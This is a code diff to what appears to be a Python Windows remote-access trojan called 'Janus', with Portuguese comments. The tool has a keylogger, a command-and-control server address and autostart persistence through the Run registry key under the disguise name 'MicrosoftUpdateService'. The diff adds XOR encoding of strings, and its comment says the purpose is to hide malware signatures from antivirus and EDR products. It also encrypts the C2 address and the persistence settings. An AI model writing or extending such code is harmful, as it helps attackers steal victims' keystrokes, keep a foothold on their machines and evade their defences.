@@ -4,6 +4,7 @@ import winreg
 import shutil
 import socket
 import base64
+import itertools
 import subprocess
 
 from time import sleep
@@ -35,13 +36,45 @@ if os.path.exists(env_path):
                     key, value = line.split('=', 1)
                     os.environ[key.strip()] = value.strip()
 
+
+# -----------------------------------------------------------------------------
+# xor_codec(text, key) -> codifica strings suspeitas
+# -----------------------------------------------------------------------------
+# Utiliza XOR para encriptar e desencriptar strings que são assinaturas
+# clássicas de malware e que geram sinal para antivirus e EDR's.
+# ord() e chr(): Convertem o caractere para o seu valor numérico ASCII e vice-versa.
+# itertools.cycle(key): Faz com que a chave se repita caso a string original seja maior.
+def xor_codec(data, key):
+    # core: XOR byte a byte
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+
+def decrypt_string(cipher_hex, key):
+    # hex -> texto (decriptar)
+    return xor_codec(bytes.fromhex(cipher_hex), key.encode('utf-8')).decode('utf-8')
+
+
+def env_or_secret(env_name, secret_hex, fallback=""):
+    value = os.environ.get(env_name)
+    if value:
+        return value
+    key = os.environ.get("DECRYPT_KEY")
+    if key:
+        try:
+            return decrypt_string(secret_hex, key)
+        except (ValueError, UnicodeDecodeError):
+            return fallback
+    return fallback
+
+
+
 # -----------------------------------------------------------------------------
 # Configurações (com fallback via .env)
 # -----------------------------------------------------------------------------
-IP = os.environ.get("JANUS_IP", "127.0.0.1")          # Endereço do servidor C2
-PORT = int(os.environ.get("JANUS_PORT", 443))         # Porta do servidor C2
-PROGRAM_NAME = os.environ.get("PROGRAM_NAME", "MicrosoftUpdateService")  # Nome usado na cópia/registro
-REGISTRY_KEY_PATH = os.environ.get("REGISTRY_KEY_PATH", r"Software\Microsoft\Windows\CurrentVersion\Run")  # Chave de autostart
+IP = env_or_secret("JANUS_IP", "5a6a0e0d5d7e020a47", "") # Endereço do servidor C2
+PORT = int(env_or_secret("JANUS_PORT", "5f6c0a", "") or 0)         # Porta do servidor C2
+PROGRAM_NAME = env_or_secret("PROGRAM_NAME", "26315a5102235d4202074745103851791f264e29142b", "")  # Nome usado na cópia/registro
+REGISTRY_KEY_PATH = env_or_secret("REGISTRY_KEY_PATH", "38375f571a3140412a1f5e42032347451c2064171e200f374e50311347560437595527294659133b561c253b05", "")  # Chave de autostart
 MAX_BUFFER_SIZE = 500  # Quantas teclas o buffer do keylog guarda antes do auto-envio
 
 # Estado global do keylogger:
@@ -54,11 +87,6 @@ buffer_auto_send_pending = False
 keylogger_active = False
 listener = None
 
-def download_file(filepath):
-    try:
-
-    except Exception as e:
-        pass
 
 # -----------------------------------------------------------------------------
 # format_key(key) -> string legível da tecla pressionada
